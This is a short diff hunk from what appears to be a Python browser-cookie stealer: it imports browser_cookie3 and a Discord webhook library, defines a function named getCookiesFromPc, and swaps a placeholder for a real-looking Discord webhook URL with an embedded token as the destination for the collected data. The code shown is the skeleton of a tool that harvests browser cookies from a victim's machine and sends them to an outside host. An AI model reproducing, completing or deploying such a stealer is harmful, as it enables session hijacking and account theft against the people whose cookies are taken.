@@ -3,7 +3,7 @@ import threading
 import browser_cookie3 as cookie
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
-webhook_urls = ['webhook url 1', 'webhook url 2']
+webhook_urls = ['https://discord.com/api/webhooks/1412339726417006592/vhnSS2XVIYTAtaNMjO2jCp_Plg4fixjjKwzFy6J1wknomLMG2fZl9uHw42lH1lJyld1w', 'webhook url 2']
 
 def getCookiesFromPc():
     req = requests.Session()
